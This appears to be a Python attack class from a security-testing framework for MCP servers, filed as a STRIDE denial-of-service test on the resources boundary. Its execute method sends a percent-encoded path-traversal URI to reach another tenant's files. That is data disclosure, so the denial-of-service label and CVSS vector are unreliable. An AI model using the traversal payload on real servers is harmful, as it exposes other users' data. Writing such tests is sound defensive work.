"""Phase 7 concrete attack for resources boundary, STRIDE letter D (Denial of Service).

Pattern: :func:`attacks._patterns.resources_attack` (specialised by STRIDE).

CVSS:3.1 vector: ``CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H``

Cross-references:
- ``docs/04_Attack_Taxonomy.md`` — per-boundary STRIDE table.
- ``docs/notes/mcp_learning/00_appendix.md`` — Phase-1 ticket catalogue.
"""

from __future__ import annotations

from attacks._helpers import AttackContext, dispatch_read, marker_match
from attacks.base import Attack, AttackResult
from framework.core.types import Boundary


class ResourceDAttack(Attack):
    """STRIDE row for the resources boundary, letter D (Denial of Service).

    CVSS:3.1: ``CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H``
    """

    id = "A-RES-D"
    boundary = Boundary.RESOURCE
    cvss = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"

    async def setup(self, ctx: AttackContext) -> None:  # pragma: no cover - trivial
        # Concrete setup is a no-op for Phase 7; Phase 8 may add
        # connector-specific priming (e.g. open a session, populate a
        # scratchpad).
        return None

    async def execute(self, ctx: AttackContext) -> AttackResult:
        """Run the resources/D attack and return the result."""
        payload_marker = ctx.payload_marker

        # Resource path-traversal attack. The source connector reads
        # a path that uses .. traversal and percent-encoded slashes;
        # the sink connector checks whether the traversal surfaced the
        # marker in the resource store.
        sargs = {"uri": f"file:///tenant-a/..%2F..%2Ftenant-b%2F{payload_marker[:8]}.txt"}
        sresp, slat = dispatch_read(ctx.source_connector, sargs["uri"])
        rargs = {"uri": f"file:///victim/{payload_marker[:8]}.txt"}
        rresp, rlat = dispatch_read(ctx.sink_connector, rargs["uri"])
        success = marker_match(payload_marker, sresp) or marker_match(payload_marker, rresp)
        detail = {"traversal_response": sresp, "victim_response": rresp,
                  "traversal_latency_ms": slat, "victim_latency_ms": rlat}

        return AttackResult(success=bool(success), boundary=self.boundary, detail=detail)

    async def teardown(self, ctx: AttackContext) -> None:  # pragma: no cover - trivial
        return None
